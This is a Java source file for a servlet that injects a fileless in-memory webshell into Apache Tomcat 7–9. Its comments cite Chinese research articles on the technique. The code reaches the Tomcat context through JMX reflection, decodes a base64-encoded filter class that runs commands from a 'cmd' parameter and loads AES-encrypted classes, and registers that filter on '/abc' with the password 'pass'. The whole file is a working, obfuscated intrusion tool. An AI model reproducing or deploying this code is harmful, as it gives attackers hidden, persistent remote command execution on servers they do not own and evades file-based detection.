package com.memshell.tomcat;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;
import sun.misc.BASE64Decoder;

import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Set;

public class FilterBasedWithoutRequestVariant extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//        参考：
//        《Tomcat源代码调试：看不见的Shell第一式》    https://www.freebuf.com/articles/web/151431.html
//        《基于tomcat的内存 Webshell 无文件攻击技术》    https://xz.aliyun.com/t/7388
//        《动态注册之Servlet+Filter+Listener》    https://www.jianshu.com/p/cbe1c3174d41
//        《基于Tomcat无文件Webshell研究》   https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA
//        《tomcat不出网回显连续剧第六集》   https://xz.aliyun.com/t/7535
//        《tomcat结合shiro无文件webshell的技术研究以及检测方法》     https://mp.weixin.qq.com/s/fFYTRrSMjHnPBPIaVn9qMg
//
//        适用范围: Tomcat 7 ~ 9

        try{
            String filterName = "dynamic1";
            String urlPattern = "/abc";
            String password = "pass";

            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository  = (Repository) field.get(obj);

            Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            for(NamedObject namedObject : objectSet){
                DynamicMBean dynamicMBean = namedObject.getObject();
                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                obj = field.get(dynamicMBean);

                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext)field.get(obj);

                field = standardContext.getClass().getDeclaredField("filterConfigs");
                field.setAccessible(true);
                HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

                if(map.get(filterName) == null) {
                    System.out.println("[+] Add Dynamic Filter");

                    //生成 FilterDef
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterDefClass = null;
                    try {
                        filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                    } catch (ClassNotFoundException e) {
                        filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                    }

                    Object filterDef = filterDefClass.newInstance();
                    filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef, filterName);

                    BASE64Decoder base64Decoder = new BASE64Decoder();
                    String codeClass = "yv66vgAAADMBQAoABgCTCQBQAJQKAJUAlgoAlQCXCgAGAJgHAJkIAJoHAJsHAGQJAJwAnQoACACeBwCfCgAIAKAIAKEHAKIKAA8AkwoADwCjCgCkAKUKAJwApgoApACnCQBQAKgHAKkKABYAqgcAqwoAGACqBwCsCgAaAKoJAK0ArggArwoAsACxCACNCwBLALIIALMKALQAtQoAtAC2BwC3CgC4ALkKALgAugoAuwC8CgAkAL0IAL4KACQAvwoAJADACwBMAMEKAMIAsQgAwwcAxAoALwCTCADFCgAvAMYKAMcAyAoALwDJCgAvAMoIAMsKALQAzAoAtADNBwDOCwA5AM8IANALANEA0goAwgDTCADUCgDVANYHANcLANEA2AoAtADZCgBAANoKANUA2wsASwDcCgDdAN4KANUA3wcA4AoACADhCADiBwDjBwDkBwDlCgBNAKoLAOYA5wcA6AcA6QEACHBhc3N3b3JkAQASTGphdmEvbGFuZy9TdHJpbmc7AQASbXlDbGFzc0xvYWRlckNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQABZQEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAVjbGF6egEABm1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAEY29kZQEABWJ5dGVzAQACW0IBACJMamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247AQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQAtTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb247AQAEdGhpcwEALExjb20vbWVtc2hlbGwvZ2VuZXJpYy9EeW5hbWljRmlsdGVyVGVtcGxhdGU7AQANU3RhY2tNYXBUYWJsZQcA6AcA6gcA4AcAmwcA6wcAnwcAqQcAqwcArAEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAOwBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAZyZXN1bHQBAANjbWQBAANrZXkBAAZjaXBoZXIBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAA5ldmlsQ2xhc3NCeXRlcwEACWV2aWxDbGFzcwEACmV2aWxPYmplY3QBABJMamF2YS9sYW5nL09iamVjdDsBAAx0YXJnZXRNZXRob2QBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEABHR5cGUHAOUBAAdkZXN0cm95AQADKClWAQAKU291cmNlRmlsZQEAGkR5bmFtaWNGaWx0ZXJUZW1wbGF0ZS5qYXZhDABWAJAMAFIAUwcA7QwA7gDvDADwAPEMAPIA8wEAEGphdmEvbGFuZy9PYmplY3QBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwcA9AwA9QBVDAD2APcBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uDAD4APMBAxB5djY2dmdBQUFETUFHd29BQlFBV0J3QVhDZ0FDQUJZS0FBSUFHQWNBR1FFQUJqeHBibWwwUGdFQUdpaE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3lsV0FRQUVRMjlrWlFFQUQweHBibVZPZFcxaVpYSlVZV0pzWlFFQUVreHZZMkZzVm1GeWFXRmliR1ZVWVdKc1pRRUFCSFJvYVhNQkFDUk1ZMjl0TDIxbGJYTm9aV3hzTDJkbGJtVnlhV012VFhsRGJHRnpjMHh2WVdSbGNqc0JBQUZqQVFBWFRHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNCQUF0a1pXWnBibVZEYkdGemN3RUFMQ2hiUWt4cVlYWmhMMnhoYm1jdlEyeGhjM05NYjJGa1pYSTdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFGWW5sMFpYTUJBQUpiUWdFQUMyTnNZWE56VEc5aFpHVnlBUUFLVTI5MWNtTmxSbWxzWlFFQUVrMTVRMnhoYzNOTWIyRmtaWEl1YW1GMllRd0FCZ0FIQVFBaVkyOXRMMjFsYlhOb1pXeHNMMmRsYm1WeWFXTXZUWGxEYkdGemMweHZZV1JsY2d3QUR3QWFBUUFWYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeUFRQVhLRnRDU1VrcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQUlRQUNBQVVBQUFBQUFBSUFBQUFHQUFjQUFRQUlBQUFBT2dBQ0FBSUFBQUFHS2l1M0FBR3hBQUFBQWdBSkFBQUFCZ0FCQUFBQUJBQUtBQUFBRmdBQ0FBQUFCZ0FMQUF3QUFBQUFBQVlBRFFBT0FBRUFDUUFQQUJBQUFRQUlBQUFBUkFBRUFBSUFBQUFRdXdBQ1dTdTNBQU1xQXlxK3RnQUVzQUFBQUFJQUNRQUFBQVlBQVFBQUFBZ0FDZ0FBQUJZQUFnQUFBQkFBRVFBU0FBQUFBQUFRQUJNQURnQUJBQUVBRkFBQUFBSUFGUT09AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwA+QD6BwDrDAD7APwMAP0A/gwA/wEADABUAFUBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgwBAQCQAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24HAQIMAQMBBAEAHVsrXSBEeW5hbWljIEZpbHRlciBzYXlzIGhlbGxvBwEFDAEGAFcMAQcBCAEABWJhc2ljBwDqDADiAQkMAQoBCwEAEWphdmEvdXRpbC9TY2FubmVyBwEMDAENAQ4MAQ8BEAcBEQwBEgETDABWARQBAAJcQQwBFQEWDAEXARgMARkBGgcBGwEACGJlaGluZGVyAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAAMARwBHQcBHgwBHwEgDAEcASEMASIBGAEAAS0MASMBJAwBJQEmAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwBJwEoAQABdQcBKQwBKgErDAEsAFcBAANBRVMHAS0MAS4BLwEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMATABMQwBMgEzDABWATQMAHQBNQwBNgE3BwE4DAE5ARgMAToBOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgwBPAE9AQAGZXF1YWxzAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcBPgwAegE/AQAqY29tL21lbXNoZWxsL2dlbmVyaWMvRHluYW1pY0ZpbHRlclRlbXBsYXRlAQAUamF2YXgvc2VydmxldC9GaWx0ZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1nZXRTdXBlcmNsYXNzAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEADXNldEFjY2Vzc2libGUBAAQoWilWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAB2lzRW1wdHkBAAMoKVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOamF2YS91dGlsL1VVSUQBAApyYW5kb21VVUlEAQASKClMamF2YS91dGlsL1VVSUQ7AQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAlzdWJzdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRw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";
                    byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                    ClassLoader cl = Thread.currentThread().getContextClassLoader();
                    Method method = null;
                    Class clz = cl.getClass();
                    while(method == null && clz != Object.class ){
                        try{
                            method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        }catch(NoSuchMethodException ex){
                            clz = clz.getSuperclass();
                        }
                    }
                    method.setAccessible(true);
                    Class clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);

                    filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, clazz.getName());
                    filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, clazz.getDeclaredConstructor(String.class).newInstance(password));
                    standardContext.getClass().getDeclaredMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);

                    //设置 FilterMap
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterMapClass = null;
                    try {
                        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                    } catch (ClassNotFoundException e) {
                        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    }

                    //使用 addFilterMapBefore 会自动把我们创建的 filterMap 丢到第一位去，无需在手动排序了
                    //其他中间件应该也是类似的
                    Object filterMap = filterMapClass.newInstance();
                    filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, filterName);
                    filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());
                    filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, urlPattern);
                    standardContext.getClass().getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filterMap);

                    //设置 FilterConfig
                    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                    constructor.setAccessible(true);
                    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                    map.put(filterName, filterConfig);
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}